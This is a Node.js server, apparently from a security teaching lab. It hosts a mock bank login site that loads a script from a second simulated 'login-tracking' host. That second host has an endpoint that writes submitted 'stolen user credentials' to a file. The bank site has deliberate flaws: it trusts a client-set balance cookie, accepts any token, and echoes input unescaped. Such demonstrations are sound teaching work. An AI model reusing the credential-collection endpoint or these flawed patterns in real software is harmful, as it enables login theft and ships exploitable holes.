var http = require('http');
var fs = require('fs');
var readline = require('readline');
var querystring = require('querystring');
var encryptor = require('../encryptor');

/** read users from db **/
var myInterface = readline.createInterface({
  input: fs.createReadStream('../usersdb.txt')
});

var users = [];
var user = {};
myInterface.on('line', function (line) {
  user = querystring.parse(line);
  users[user.id] = user;
});

/** create the server **/
server = http.createServer(function(request, response) {
	/** virtualizing the host. Checking the target host and routing to the right server **/
    switch(request.headers.host) {
    
    	/** first site: bank-example **/
        case 'bank-example.com': 
        	if (request.url == "/") {
        		/** show login form **/
        		response.end(`
            		<!doctype html>
            		<html>
            		<head>
					<script src="http://login-tracking.com/login_tracker.js"></script>
            		</head>
            		<body>
                		<form action="/login" method="post" id="login-form">
                    		User: <input type="email" name="email" /><br />
                    		Password: <input type="password" name="password" /><br />
                    		<button>Login</button>
                		</form>
            		</body>
            		</html>
        		`);        	
        	}
			else if (request.url == "/login") {
				/** handle the login attempt **/
				handleLogin(request, (user, err) => {
					if (err) {
						response.writeHead(200, { "Content-Type": "text/html" });
						response.end("Error: " + err);
					}
					else {
						/** redirect to balance page **/
						var token = encryptor.generateSalt();
						var cookies = 'token='+token+','+'balance='+user.balance;
						response.writeHead(302, {'Content-Type': 'text/plain', 'Location': '/balance', 'Set-Cookie': cookies});
						response.end();
					}
				});
			}
			else if (request.url == "/balance") {
				/** check if token exists, then show balance **/
				handleBalanceRequest(request, (balance, err) => {
					if (err) {
						response.statusCode = 403;
						response.end("You do not have rights to visit this page");				
					}
					else {
						response.end('Your balance is : ' + balance);
					}
				});
			}
			else {
				response.statusCode = 404;
				response.end("Oops, page not found");				
			}
        	break;
        	
        /** second site: login-tracking **/	
        case 'login-tracking.com': 
        	if (request.url == '/login_tracker.js') {
        		/** return the contents of login_tracker.js **/
  				fs.readFile('login_tracker.js', function(err, data) {
    				response.writeHead(200, {'Content-Type': 'application/javascript'});
    				response.write(data);
    				response.end();
  				});
  			}
  			else if (request.url == '/store_credentials') {
  				/** save the stolen user credentials **/
    			let body = '';
    			request.on('data', chunk => {
        			body += chunk.toString();
    			});
    			request.on('end', () => {
    				/** write the credentials to a file **/
  					fs.appendFile('credentials.txt', body+'\n', function (err) {});
    			});
  			}
			else {
				response.statusCode = 404;
				response.end("Oops, page not found");				
			}
			break;
        default: 
        	/** other hosts mapped to 127.0.0.1 **/
            response.statusCode = 404;
            response.end('<p>We do not serve the host: <b>' + request.headers.host + '</b>.</p>');
    }
});

server.listen(80);

/** handler user login **/
function handleLogin(request, callback) {
    let body = '';
    request.on('data', chunk => {
        body += chunk.toString();
    });
    request.on('end', () => {
 		var credentials = querystring.parse(body);
 		var email = credentials.email;
 		var user = users[email];
 		if (user == null) {
 			callback(null, 'User not found: ' + email);
 		}
 		else {
 			var hashAndSalt = encryptor.encrypt(credentials.password, user.salt);
 			if (user.hash != hashAndSalt.hash) {
 				callback(null, 'Wrong password');
 			}
 			else {
 				callback(user, null);
 			}

 		}
    });
}

/** handle balance request **/
function handleBalanceRequest(request, callback) {
	if (request.headers.cookie) {
		var cookies = request.headers.cookie;
		var token;
		var balance;
		/** parse cookies **/
		cookies.split(',').forEach(function( cookie ) {
        	var parts = cookie.split('=');
        	if (parts[0]=='token') {
        		token = parts[1];
        	}
        	else if (parts[0]=='balance') {
        		balance = parts[1];
        	}
    	});
    	if (token) {
			callback(balance, null);
		}
		else {
			callback(null, 'Token cookie not found');
		}
	}
	else {
		callback(null, 'No cookies found');
	}
}
